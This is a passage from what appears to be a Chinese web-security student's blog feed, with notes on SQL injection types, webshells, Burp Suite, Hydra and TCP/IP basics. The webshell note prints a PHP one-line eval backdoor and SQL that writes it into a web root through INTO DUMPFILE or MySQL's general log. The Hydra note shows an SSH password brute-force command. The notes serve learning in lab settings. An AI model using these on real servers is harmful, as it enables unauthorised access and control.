注入漏洞两个关键条件</strong>：</p><ul><li>用户能控制输入的内容</li><li>Web 应用把用户输入的内容带入到数据库中执行</li></ul><h4 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h4><p><strong>根据请求不同可以分为</strong>：</p><ul><li>GET 请求方式注入</li><li>POST 请求方式注入</li><li>请求头</li></ul><p><strong>根据 SQL 注入点的类型参数分为</strong>：</p><ul><li>整型注入</li><li>字符型注入</li></ul><p><strong>只要有数据提交到数据库中的地方就可能存在注入点</strong></p><p>如何区整数型字和字符型</p><ol><li><p>数字-1      判断字符型和数字型</p><p>结果不变   →     不是数字型</p></li><li><p>右边加 ‘ 无数据 无 SQL 错误   →   不一定有注入</p></li><li><p>右边加 ‘ # 有数据 →  有注入</p></li></ol><p><strong>根据 SQL 注入点的反馈类型可分为</strong>：</p><ul><li>基于错误显示的 SQL 注入</li><li>UNION 类型的 SQL 注入</li><li>布尔类型的 SQL 注入</li><li>基于时间的 SQL 注入</li><li>多语句</li><li>内联</li></ul><p><strong>根据 Web 应用常用的数据库类型分类</strong>：</p><ul><li><p>MySQL 数据库注入</p></li><li><p>SQLServer 数据库注入</p></li><li><p>Oracle 数据库注入</p></li><li><p>Access数据库注入</p></li><li><p>MongoDB 数据库注入</p></li></ul><p><strong>注入方法分类</strong>：</p><ul><li>直接页面看到数据<ul><li>UNION SELECT</li><li>报错</li></ul></li><li>一个一个字母判断值<ul><li>布尔盲注</li><li>时间延时注入</li><li>内联</li></ul></li><li>多语句</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note31</title>
      <link href="/2019/08/27/note31/"/>
      <url>/2019/08/27/note31/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。</p><a id="more"></a><!--export--><!--toc--><h3 id="学习目的"><a href="#学习目的" class="headerlink" title="学习目的"></a>学习目的</h3><ul><li>熟悉 PHP 命令执行的函数</li><li>理解什么是 webshell</li><li>能够写出一句话木马</li><li>能够利用大马</li><li>熟练中国菜刀的使用</li><li>理解 webshell 的变形</li></ul><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Phpmyadmin</p><p>​    getshell 一般情况下，两种操作方式</p><p>SQL 语句 into outfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;123&quot; INTO DUMPFILE &quot;绝对路径&quot;; # 直接写文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&quot; INTO DUMPFILE &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;;</span><br></pre></td></tr></table></figure><p><code>--secure-file-priv option</code></p><p>源代码拷贝到网站根目录中，之后修改权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R apache: apache /var/www/html</span><br></pre></td></tr></table></figure><p>一定要弄清楚权限</p><p>php 代码    apache用户</p><p>数据库操作 SQL 语句       mysql 用户</p><p>mysql 日志写 webshell</p><p>mysql 每执行一个 sql 语句，就会把 sql 语句写入到文件日志中，但默认情况下，这个选项是关闭的，因此需要去开启这个选项，再设置日志路径，日志路径设置为网站目录，日志文件名字为 .php 结尾的文件</p><p>general log   OFF -&gt; ON   打开日志功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW MASTER LOGS;</span><br><span class="line">SET GLOBAL general_log = &apos;ON&apos;</span><br><span class="line">SET GLOBAL general_log_file = &apos;C:/phpStudy/PHPTutorial/WWW/404.php&apos;</span><br></pre></td></tr></table></figure><p>执行任意 sql 语句，就能把内容存到 .php 结尾的文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&quot;</span><br></pre></td></tr></table></figure><p>除了 <code>&lt;?php ?&gt;</code> 其他均解析为 html</p><p>php 的短标签：</p><ul><li><? php ?></li><li><p>&lt;% %&gt;</p></li><li><? ?></li><li><script language="php"> </script></li></ul><h3 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h3><h4 id="执行-PHP-代码："><a href="#执行-PHP-代码：" class="headerlink" title="执行 PHP 代码："></a>执行 PHP 代码：</h4><p>​    eval(), assert()</p><h4 id="执行系统命令："><a href="#执行系统命令：" class="headerlink" title="执行系统命令："></a>执行系统命令：</h4><pre><code>* system() 输出并返回最后一行 shell 结果* exec() 不输出结果，返回最后一行 shell 结果，所有结果可以保存一个返回的数组里面* passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上* popen()* shell_exec()* proc_open()* pcntl_exec()</code></pre><p>反引号 ` 这个实际上使用的是 shell_exec</p><h4 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec()函数"></a>exec()函数</h4><p>exec函数，执行外部程序，不直接显示输出，只显示最后一行结果，一般把结果输出到数组中保存。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"ipconfig"</span>, $output);l</span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="number">1</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>执行外部程序，不直接显示输出，与 shell_exec() 函数等同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> `ipconfig`;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank" rel="noopener">更多函数</a></p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>shell 是系统的用户界面，提供了用户与内核进行交互操作的一种接口。</p><h4 id="什么是-webshell"><a href="#什么是-webshell" class="headerlink" title="什么是 webshell"></a>什么是 webshell</h4><p>黑客在入侵了一个网站后，通常会留下一个 asp、aspx、jsp、php 等脚本后门文件与网站 web 服务器进行交互，得到了一个命令执行环境，以达到控制网站服务器的目的，这个后门文件就是所谓的 webshell。</p><h4 id="一句话木马介绍"><a href="#一句话木马介绍" class="headerlink" title="一句话木马介绍"></a>一句话木马介绍</h4><p>一句话木马是 webshell 的一种，由与这类 webshell 代码比较少，往往只有一行代码，所以就被称为一句话木马。</p><p>一句话木马虽然代码简单，但结合中国菜刀等 webshell 管理工具，它们的功能确实非常强大的。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note30</title>
      <link href="/2019/08/24/note30/"/>
      <url>/2019/08/24/note30/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 使用 <code>burpsuite</code> 抓取手机数据包，以及本周疑难点总结</p><a id="more"></a><!--export--><!--toc--><h3 id="利用burpsuite抓取手机数据包"><a href="#利用burpsuite抓取手机数据包" class="headerlink" title="利用burpsuite抓取手机数据包"></a>利用burpsuite抓取手机数据包</h3><h4 id="手机和电脑连接同一网络"><a href="#手机和电脑连接同一网络" class="headerlink" title="手机和电脑连接同一网络"></a>手机和电脑连接同一网络</h4><p>查看电脑 <code>IP</code> </p><p><img src="/images/83ip.png" alt> </p><h4 id="配置burpsuite和手机代理"><a href="#配置burpsuite和手机代理" class="headerlink" title="配置burpsuite和手机代理"></a>配置burpsuite和手机代理</h4><p><strong>burpsuite</strong>:</p><p><img src="/images/84bpTel3.png" alt></p><p>在 <code>Proxy</code> 中选择 <code>Options</code> 点击 <code>Add</code>，绑定端口填入 <code>8080</code> ，<code>Specific address</code>选择第一步查看到的 <code>IP</code>，配置完后点击 <code>Import/export CA certificate</code>。</p><p><strong>手机代理</strong>：</p><p>长按连接的 <code>wifi</code>，选择显示高级选项，代理选择 <code>手动</code> ，主机名填写 第一步的 <code>IP</code>，端口号 <code>8080</code>，<code>IP</code> 设置选择 <code>DHCP</code> </p><h4 id="下载证书并导入手机"><a href="#下载证书并导入手机" class="headerlink" title="下载证书并导入手机"></a>下载证书并导入手机</h4><p>打开手机浏览器，输入第一步的 <code>IP</code> 地址和端口号，会进入 <code>burpsuite</code> 证书下载界面，点击证书选择下载，若下载的是 <code>.cer</code>直接安装就好，若为 <code>.der</code>重命名为 <code>.cer</code>，点击安装后，证书名称输入 <code>CA</code>，凭据用途选择 <code>WLAN</code> 完成后就可以用 <code>burpsuite</code> 抓取手机数据包了。</p><p>在手机打开搜狐新闻抓取数据包如下：</p><p><img src="/images/85bpTel2.png" alt>  </p><p><img src="/images/86bpTel.png" alt></p><p>可以从 <code>User-Agent</code>看出手机型号。</p><h3 id="为什么三次握手？"><a href="#为什么三次握手？" class="headerlink" title="为什么三次握手？"></a>为什么三次握手？</h3><p>三次握手的作用是：通信双方能明确自己的收发以及对方的收发是正常的。</p><h4 id="第一次握手"><a href="#第一次握手" class="headerlink" title="第一次握手"></a>第一次握手</h4><p>客户端给服务端发送网络包，服务端接收到了数据包。对于服务端来说可以有以下结论：客户端的发送功能以及服务端的接收功能是正常的；对于客户端来说，无法得出结论。</p><h4 id="第二次握手"><a href="#第二次握手" class="headerlink" title="第二次握手"></a>第二次握手</h4><p>服务端发包，客户端接收。客户端接收包，对于客户端来说，首先接收到了包，说明第一次发送成功了，说明自己的收发没有问题，其次，也可以得出服务端的收发是没有问题的。即经过第二次握手后，客户端已经明确自己和对方的收发功能是否正常了。但，服务端目前还不能判断自己的发送和客户端的接收是否正常。</p><h4 id="第三次握手"><a href="#第三次握手" class="headerlink" title="第三次握手"></a>第三次握手</h4><p>客户端发包，服务端接收。前两次握手后，服务端无法明确客户端的接收和自己的发送能力是否正常。而第三次握手后，服务端收到了客户端对第二次握手作回应，对服务端来说，第二次握手响应数据发出后，客户端接收到了。所以我的发送能力是正常的，而客户端的接收能力也是正常的。</p><table><thead><tr><th>握手次数</th><th>客户端</th><th>服务端</th></tr></thead><tbody><tr><td>第一次</td><td>发数据</td><td>客户端发送能力正常，服务端的接收能力正常</td></tr><tr><td>第二次</td><td>客户端收发正常，服务端的收发正常</td><td>发数据</td></tr><tr><td>第三次</td><td>发数据</td><td>客户端收发正常，服务端收发正常</td></tr></tbody></table><p><em>参考文献</em></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/53374516" target="_blank" rel="noopener">“三次握手，四次挥手”你真的懂吗？</a></p></blockquote><h3 id="为什么建立连接是三次握手，而关闭连接却是四次挥手？"><a href="#为什么建立连接是三次握手，而关闭连接却是四次挥手？" class="headerlink" title="为什么建立连接是三次握手，而关闭连接却是四次挥手？"></a>为什么建立连接是三次握手，而关闭连接却是四次挥手？</h3><p>服务端在 <code>LISTEN</code> 状态下，收到建立连接请求的 <code>SYN</code> 报文后，把 <code>ACK</code> 和 <code>SYN</code> 放在一个报文里发送给客户端。而关闭连接时，当收到对方的 <code>FIN</code> 报文时，仅仅表示对方不再发送数据了，但还是可以接收数据 ，己方是否现在关闭发送通道，需要上层应用来决定，因此，己方的 <code>ACK</code> 和 <code>FIN</code> 一般都会分开发送。</p><p><img src="/images/87fourbai.gif" alt></p><p><em>参考文献</em></p><blockquote><p><a href="https://blog.csdn.net/qzcsu/article/details/72861891" target="_blank" rel="noopener">图片来源</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516" target="_blank" rel="noopener">“三次握手，四次挥手”你真的懂吗？</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note29</title>
      <link href="/2019/08/23/note29/"/>
      <url>/2019/08/23/note29/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 学习网络层数据包的结构， <code>ARP</code> 协议、<code>IP</code> 协议和 <code>ICMP</code> 协议以及 <code>wireshark</code> 获取网络层的数据包。</p><a id="more"></a><!--export--><!--toc--><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li>熟悉网络层数据包结构</li><li>熟悉<code>ARP</code> 协议、<code>IP</code> 协议、<code>ICMP</code> 协议</li><li>能够看懂 <code>wireshark</code>获取到的网络层数据包 </li></ul><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><h5 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h5><p><code>ARP</code>: <code>Address Resolution Protocol</code> 协议，即地址解析协议，把网络层的 <code>IP</code> 地址翻译成在数据链路层寻址的48位硬件地址（<code>MAC</code>地址）。</p><p>在 <code>OSI</code> 模型中 <code>ARP</code> 协议属于链路层；在 <code>TCP/IP</code> 模型中，<code>ARP</code> 协议属于网络层。</p><h5 id="ARP协议工作流程"><a href="#ARP协议工作流程" class="headerlink" title="ARP协议工作流程"></a>ARP协议工作流程</h5><p><strong>第一步</strong>：在每台主机都设有一个 <code>ARP</code> 高速缓存，保存局域网上各主机和路由 <code>IP</code> 地址到硬件地址的映射表。当 <code>A</code>主机向 <code>B</code>主机发送一个数据包时，<code>A</code> 主机先在其高速缓存中查看有无 <code>B</code> 的 <code>IP</code> 地址对应的 <code>MAC</code>地址，如果有把硬件地址写入到数据包。</p><p><strong>第二步</strong>：若没有找到，<code>APR</code> 进程在局域网上广播发送一个 <code>ARP</code> 请求分组，数据包的主要内容是：“我的 <code>IP</code> 值是<code>1.1.1.1</code>，硬件地址是 <code>xx-xx-xx-xx-xx-xx-xx-xx</code>。我想知道<code>IP</code>地址为 <code>2.2.2.2</code> 的主机硬件地址”，局域网上所有主机上都会收到这个 <code>ARP</code> 请求分组。</p><p><strong>第三步</strong>：主机 <code>B</code> 收到了主机 <code>A</code> 发送的 <code>ARP</code> 请求分组数据包，发现请求的 <code>IP</code> 和自己的 <code>IP</code> 一样，就收下这个 <code>IP</code>，并向主机<code>A</code>发送 <code>ARP</code> 响应分组，同时把数据包带有 <code>A</code> 的硬件地址写入自己的 <code>ARP</code> 缓存表。其余所有的主机因为 <code>IP</code> 不匹配都不会理会这个请求数据包。响应包的主要内容是：“我的 <code>IP</code> 地址是 <code>2.2.2.2</code>，我的硬件地址是 <code>yy-yy-yy-yy-yy-yy-yy-yy</code>”，单独发送给 <code>A</code>，不会广播。</p><p><strong>Note</strong>: <code>ARP</code> 对保存在高速缓存中的每一个映射地址都设置生存时间，超过生存时间就会从缓存表中删除，防止对方硬件地址突然失效，比如拔下网线，更换网卡；当硬件地址发生变化，主机会发送一个无偿的 <code>ARP</code> 数据包，广播给局域网内所有鸡器。</p><h4 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h4><p><code>IP</code> 在 <code>ARP</code> 的上层，<code>ICMP</code> 和 <code>IGMP</code>在 <code>IP</code> 的上层。</p><p><img src="/images/78ip.png" alt></p><p><img src="/images/79ipprotocol.png" alt></p><h4 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h4><h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><p><code>ICMP</code>: <code>Internet Control Message Protocol</code> ，即网际报文控制协议。用于在<code>IP</code> 主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。大部分网络检修技巧和工具都是基于<code>ICMP</code>的。简单点说，<code>ICMP</code>常用于寻找网络故障。</p><h5 id="tracert工作原理"><a href="#tracert工作原理" class="headerlink" title="tracert工作原理"></a>tracert工作原理</h5><p><code>tracert</code> 从源主机向目的主机发送一连串 <code>ICMP</code> 数据包。第一个数据包 <code>P1</code> 的生存时间 <code>TTL=1</code>，当 <code>P1</code> 数据包到达路径上第一个路由器 <code>R1</code> 时候，路由器把 <code>TTL</code> 减一，然后发现 <code>TTL=0</code>，<code>R1</code>就丢弃 <code>P1</code>，然后发送一个 <code>ICMP</code>时间超过差错报文。下一个数据包 <code>TTL=2</code>，到第二个路由器 <code>R2</code>被丢弃，以此类推。</p><p>当 <code>TTL</code> 等于某一个数值时候，刚好到达目的主机，目的主机就返回一个正常的响应包，告诉源主机已经到达目的主机。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>在网络中进行通信的实体是主机中的进程，网络层为主机之间提供逻辑通信，而传输层为应用进程之间提供端到端的逻辑通信。传输层还要对报文进行差错检测，提供可靠的运输。但在网络层，<code>IP</code> 数据包检测只针对首部，不检查数据部分。</p><p>传输层的两个主要协议：</p><pre><code>* 传输控制协议 `TCP` (`Transmission Control Protocol`)* 用户数据包协议`UDP` (`User Datagram Protocol`)</code></pre><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><ol><li><code>TCP</code> 提供面向连接的服务。在传送数据前必须先建立会话，进行流量控制，保证可靠传输。</li><li><code>UDP</code> 传输之间不需要建立连接，不提供可靠交付，简单点说就是发送出去就不管了。适合一个数据包就能完成通信，或者对丢包了没必要重传的应用。</li></ol><p><img src="/images/80tcpudp.png" alt></p><h4 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h4><h5 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h5><p><img src="/images/81threehands.png" alt></p><ol><li>客户端发送 <code>SYN</code> 段，并指明客户端的初始化序列号，即 <code>ISN(s)</code></li><li>服务端发送自己的 <code>SYN</code>段作为应答，同样指明自己的 <code>ISN(s)</code> 。为了确认客户端的 <code>SYN</code>，将 <code>ISN(c)+1</code> 作为 <code>ACK</code> 数值。这样，每发送一个 <code>SYN</code>，序列号就会加1。如果有丢失情况，则会重传。</li><li>为了确认服务器端的 <code>SYN</code>，客户端将 <code>SYN(s)+1</code>作为返回的 <code>ACK</code>数值。</li></ol><h5 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h5><p><img src="/images/82foursaybai.png" alt></p><ol><li>客户端发送一个 <code>FIN</code> 段，并包含一个希望接受这看到的自己当前的序列号 <code>K</code>，同时还包含一个 <code>ACK</code> 表示确认对方最近一次发过来的数据。</li><li>服务端将 <code>K</code>值加1作为 <code>ACK</code> 序号值，表明收到了上一个包。这是上层应用程序会被告知另一端发起了关闭操作，通常将这引起应用程序发起自己的关闭。</li><li>服务端发起自己的 <code>FIN</code> 段， <code>ACK=K+1</code>，<code>Seq=L</code> 。</li><li>客户端确认，<code>ACK=L+1</code></li></ol><h4 id="DNS域名解析"><a href="#DNS域名解析" class="headerlink" title="DNS域名解析"></a>DNS域名解析</h4><h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><ol><li>浏览器输入 <code>www.xxx.com</code> 域名，操作系统会检查自己本地的 <code>hosts</code> 文件是否有这个映射关系，若有，就先调用这个 <code>IP</code> 地址映射，完成域名解析。</li><li>若 <code>hosts</code> 没有这个域名映射，则查找本地 <code>DNS</code> 解析器缓存，是否有这个网址映射关系，若有直接返回，完成域名解析。</li><li>若 <code>hosts</code> 与本地 <code>DNS</code> 解析器缓存都没有相应的网址映射关系，首先会找 <code>TCP/IP</code> 参数设置的首选 <code>DNS</code> 服务器，即本地 <code>DNS</code> 服务器，此服务器收到查询时，若要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析。</li><li>若本地 <code>DNS</code> 服务器解析失败，则到根 <code>DNS</code> 解析器请求。</li></ol><h4 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h4><p><code>DHCP</code>: <code>Dynamic Host Configuration Protocol</code>，即动态主机配置协议，是一个应用层协议，工作在局域网，使用 <code>UDP</code> 协议，能够让设备自动获取重要网络资源，本质就是在 <code>DHCP</code> 服务器上有一个数据库，存放着 <code>IP</code>地址、网关、<code>DNS</code>等参数。</p><h5 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h5><ol><li>自动分配方式：<code>DHCP</code>给主机指定一个永久的 <code>IP</code> 地址，一旦 <code>DHCP</code> 客户端第一次成功的从 <code>DHCP</code> 服务器租用到 <code>IP</code>位址后，就永远使用这个位址。</li><li>动态分配方式：<code>DHCP</code> 给主机指定一个有”时间限制”的 <code>IP</code> 地址，到时间或主机明确表示放弃这个地址时，这个地址可以被其他主机使用，当然，客户端可以比其他主机更优先延续租用。</li><li>手动分配方式：主机 <code>IP</code> 地址由网络管理员指定，它可以按照 <code>MAC</code>地址固定分配 <code>IP</code> 位址，<code>DHCP</code> 只是把指定的 <code>IP</code> 地址告诉主机，相当于将某个 <code>MAC</code> 和 <code>IP</code> 进行了静态绑定。</li></ol><h5 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h5><ol><li>新机器加入网络时，会使用 <code>0.0.0.0</code> 作为源地址，发送广播<code>discover</code>报文，查询网络上有哪些 <code>DHCP server</code> </li><li><code>DHCP</code> 服务器接收到 <code>DHCP Discover</code> 报文后，回应 <code>Offer</code> 报文，提供 <code>IP</code> 地址给请求方</li><li>请求方根据收到的 <code>Offer</code> 报文，选择一个 <code>DHCP server</code> ，并选择它提供的 <code>IP</code> 地址，然后广播 <code>Request</code> 报文，向 <code>DHCP Server</code> 请求该 <code>IP</code> 地址，同时想本地网络公告自己已经选择了某个 <code>DHCP Server</code> 的某个 <code>IP</code> 地址</li><li><code>DHCP Server</code> 回应 <code>ACK</code> 报文，将 <code>IP</code> 地址分配给 <code>Client</code> 端</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note28</title>
      <link href="/2019/08/22/note28/"/>
      <url>/2019/08/22/note28/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>hadra</code> 的使用及计算机网络基础</p><a id="more"></a><!--export--><!--toc--><h3 id="Hadra的使用"><a href="#Hadra的使用" class="headerlink" title="Hadra的使用"></a>Hadra的使用</h3><table><thead><tr><th>参数</th><th>用法</th></tr></thead><tbody><tr><td>-l LOGIN</td><td>指定破解的用户，对特定用户破解</td></tr><tr><td>-L FILE</td><td>指定用户名字典</td></tr><tr><td>-p PASS</td><td>小写，指定密码破解</td></tr><tr><td>-P FILE</td><td>大写，指定密码字典</td></tr><tr><td>-M FILE</td><td>指定目标列表文件一行一条</td></tr><tr><td>-t TASKS</td><td>同时运行的线程数</td></tr></tbody></table><p>实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l username -P password.txt -t 6 ssh://ip</span><br></pre></td></tr></table></figure><p>在物理机上用 <code>ssh</code> 连接 <code>VM</code> 的 <code>CentOS</code> ，</p><p><img src="/images/73powershell.png" alt> </p><p>然后在 <code>Kali</code> 用 <code>hydra</code> 破解密码。</p><p><img src="/images/74hydra.png" alt></p><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li>了解常见的网络设备</li><li>了解三种网络模型</li><li>了解互联网中数据传输方式</li><li>深入理解网络层协议</li><li>深入理解运输层协议</li><li>深入理解应用层协议</li></ul><h4 id="认识网络设备"><a href="#认识网络设备" class="headerlink" title="认识网络设备"></a>认识网络设备</h4><p>网卡：允许计算机在计算机网络上进行通讯的计算机硬件，拥有 <code>MAC</code> 地址，属于 <code>OSI</code> 模型第一层。</p><p><strong>修改 <code>MAC</code>地址</strong>： 设备管理器 → 网络适配器 → 选择网卡 → 网络连接 → 修改</p><p>集线器：工作与 <code>OSI</code> 模型第一层，属于纯硬件网络底层设备，发送数据没有针对性，采用广播方式发送。</p><p>交换机：工作与 <code>OSI</code> 模型第二层，具有”智能记忆“能力和”学习“能力，使用 <code>MAC</code> 来寻址。</p><p>路由器：连接两个或多个网络的硬件设备，在网络间起网卡的作用，运行在 <code>OSI</code> 模型第三层，使用 <code>IP</code> 地址来通信。</p><h4 id="OSI网络分层"><a href="#OSI网络分层" class="headerlink" title="OSI网络分层"></a>OSI网络分层</h4><p>参见<a href="https://meethanmj.github.io/2019/08/20/note26/" target="_blank" rel="noopener">note26</a></p><h4 id="数据传输过程"><a href="#数据传输过程" class="headerlink" title="数据传输过程"></a>数据传输过程</h4><p><img src="/images/77data_how_to_tran.png" alt></p><h4 id="数据封装过程"><a href="#数据封装过程" class="headerlink" title="数据封装过程"></a>数据封装过程</h4><p><img src="/images/75package.png" alt></p><h4 id="数据解封过程"><a href="#数据解封过程" class="headerlink" title="数据解封过程"></a>数据解封过程</h4><p><img src="/images/76unpackage.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite</title>
      <link href="/2019/08/22/burpsuite/"/>
      <url>/2019/08/22/burpsuite/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 在 <code>Web</code> 应用的安全测试或扫描中，长时间无操作或意外出发 <code>logout</code> ，均会导致会话失效，访问请求跳到登录页面，需要再次登录，手工登录会有一些繁琐，其实完全可以使用 <code>Burpsuite</code> 的宏在会话失效后完成自动登录。</p><a id="more"></a><!--export--><!--toc--><h3 id="使用宏维持会话有效"><a href="#使用宏维持会话有效" class="headerlink" title="使用宏维持会话有效"></a>使用宏维持会话有效</h3><h4 id="分析登录过程"><a href="#分析登录过程" class="headerlink" title="分析登录过程"></a>分析登录过程</h4><p>在 <code>Firefox</code> 浏览器中登录 <code>DVWA</code> 后，点击 <code>Logout</code> 退出登录，然后在重新登录，用 <code>Burpsuite</code> 分析登录过程。登陆退出后，页面跳转到 <code>login.php</code> , 服务器响应内容中包含 <code>user_token</code>。重新执行登录时，登录请求包含上一次得到的 <code>user_token</code>。登录成功后，服务响应 <code>302</code> ，跳转到 <code>index.php</code>。</p><h4 id="创建用户登录宏"><a href="#创建用户登录宏" class="headerlink" title="创建用户登录宏"></a>创建用户登录宏</h4><p>理清登录流程后，根据这个流程创建一个用户登录的宏。账号重新登录时，需要两个动作，第一个是 <code>GET</code> 请求 <code>login.php</code> 页面，获取 <code>user_token</code> ，下一个动作是发现账号、密码和 <code>user_token</code> 进行登录。在录制宏选项中，按住<code>Ctrl</code>，选择两个请求。第一个动作的 <code>GET</code> 请求，与前面的 <code>CSRF</code> 绕过的配置一样，选择 <code>user_token</code> 位置，添加变量。第二个动作，<code>POST</code> 请求的几个参数，<code>username</code>、<code>password</code>、<code>Login</code>都保持不变，<code>user_token</code>使用宏里上一次请求的参数返回值。完成后保持宏，命名为<code>user_Login</code>。</p><h4 id="创建会话处理规则"><a href="#创建会话处理规则" class="headerlink" title="创建会话处理规则"></a>创建会话处理规则</h4><p>添加一条新规则，规则描述为 <code>User_Login</code>，添加规则动作，选择 <code>Check session is valid</code>，验证会话是否有效。设置判断会话是否失效的标志和会话失效后的操作，会话失效后，运行之前的登录宏，从宏的请求响应中更新参数值。<code>Tools Scope</code>选择上 <code>Proxy</code>，<code>URL Scope</code>添加整个 <code>DVWA</code>路径。</p><h4 id="验证规则有效性"><a href="#验证规则有效性" class="headerlink" title="验证规则有效性"></a>验证规则有效性</h4><p>浏览器清除所有的 <code>Cookie</code>，输入 <code>DVWA</code> 地址，<code>Burpsuite</code> 宏自动登录网站，浏览器页面不会跳转到登录页面，而是直接进入主界面。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note27</title>
      <link href="/2019/08/21/note27/"/>
      <url>/2019/08/21/note27/</url>
      
